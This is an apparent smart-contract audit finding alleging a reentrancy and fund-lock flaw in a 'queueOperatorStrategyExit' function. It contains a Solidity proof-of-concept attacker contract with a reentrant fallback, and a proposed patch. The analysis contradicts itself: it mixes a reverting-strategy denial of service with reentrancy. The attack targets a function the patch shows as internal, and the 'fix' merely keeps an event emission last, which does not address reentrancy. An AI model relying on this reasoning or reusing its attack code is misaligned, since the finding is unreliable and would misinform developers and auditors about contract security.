# Potential Reentrancy Vulnerability in queueOperatorStrategyExit Causing Fund Lock

## Summary
The **queueOperatorStrategyExit** function in the contract is vulnerable to a denial of service (DoS) attack due to the potential of a malicious strategy contract causing the **delegator.queueWithdrawalForOperatorExit(strategy, sharesToExit)** call to revert. If the strategy contract is designed to revert on withdrawal, it can lead to the locking of funds with no recovery mechanism in place within the function. This function lacks safeguards against such malicious behavior, which poses a significant risk as it could result in the permanent or temporary loss of an operator's shares if a strategy behaves maliciously.
## Vulnerability Detail
The root cause of the potential reentrancy vulnerability in the **queueOperatorStrategyExit** function lies in the fact that the function interacts with an external contract (**IRioLRTOperatorDelegator**) and then emits an event before completing the function execution. This allows an attacker to potentially call back into the contract before the function completes, leading to a reentrancy attack.

Specifically, an attacker could potentially call the **queueWithdrawalForOperatorExit** function in the **IRioLRTOperatorDelegator** contract in such a way that it triggers another function call back into the **queueOperatorStrategyExit** function before it completes. This could result in unexpected behavior and fund lock if not handled properly.

**Proof of Concept (PoC) Code:**

1. Deploy a malicious contract with a fallback function that calls the **queueOperatorStrategyExit** function of the vulnerable contract repeatedly.

```solidity
pragma solidity ^0.8.0;

interface VulnerableContract {
    function queueOperatorStrategyExit(uint8 operatorId, address strategy) external;
}

contract MaliciousContract {
    VulnerableContract vulnerableContract;
    uint8 operatorId;
    address strategy;

    constructor(address _vulnerableContract, uint8 _operatorId, address _strategy) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
        operatorId = _operatorId;
        strategy = _strategy;
    }

    fallback() external {
        vulnerableContract.queueOperatorStrategyExit(operatorId, strategy);
    }

    function startAttack() public {
        vulnerableContract.queueOperatorStrategyExit(operatorId, strategy);
    }
}
```

2. Deploy the vulnerable contract and the malicious contract, passing the vulnerable contract address, **operatorId**, and strategy to the malicious contract constructor.
3. Call the **startAttack** function of the malicious contract to trigger the reentrancy attack.

This attack exploits the vulnerability by repeatedly calling the **queueOperatorStrategyExit** function before the state is updated, causing the funds to be locked in the deposit pool.
## Impact
The maximum impact of this vulnerability is the loss of availability of the funds associated with the **operatorId** and **strategy** provided to the function, leading to financial loss and damage to the contract's integrity.

## Tool used

Manual Review

## Recommendation
To fix this issue, the withdrawal process should be completed before emitting the event. This can be achieved by reordering the code so that the withdrawal is processed first, and then the event is emitted.

Here is the patched code example:

```solidity
144       function queueOperatorStrategyExit(IRioLRTOperatorRegistry.OperatorDetails storage operator, uint8 operatorId, address strategy) internal {
145           IRioLRTOperatorDelegator delegator = IRioLRTOperatorDelegator(operator.delegator);
146   
147           uint256 sharesToExit;
148           if (strategy == BEACON_CHAIN_STRATEGY) {
149               // Queues an exit for verified validators only. Unverified validators must by exited once verified,
150               // and ETH must be scraped into the deposit pool. Exits are rounded to the nearest Gwei. It is not
151               // possible to exit ETH with precision less than 1 Gwei. We do not populate `sharesToExit` if the
152               // Eigen Pod shares are not greater than 0.
153               int256 eigenPodShares = delegator.getEigenPodShares();
154               if (eigenPodShares > 0) {
155                   sharesToExit = uint256(eigenPodShares).reducePrecisionToGwei();
156               }
157           } else {
158               sharesToExit = operator.shareDetails[strategy].allocation;
159           }
160           if (sharesToExit == 0) revert IRioLRTOperatorRegistry.CANNOT_EXIT_ZERO_SHARES();
161   
162           // Queues a withdrawal to the deposit pool.
163           bytes32 withdrawalRoot = delegator.queueWithdrawalForOperatorExit(strategy, sharesToExit);
164           
165           // Emit event after completing the withdrawal process
166           emit IRioLRTOperatorRegistry.OperatorStrategyExitQueued(operatorId, strategy, sharesToExit, withdrawalRoot);
167       }
```
By completing the withdrawal process before emitting the event, the vulnerability is mitigated as the funds are safely withdrawn before any external contract can potentially call back into the function.
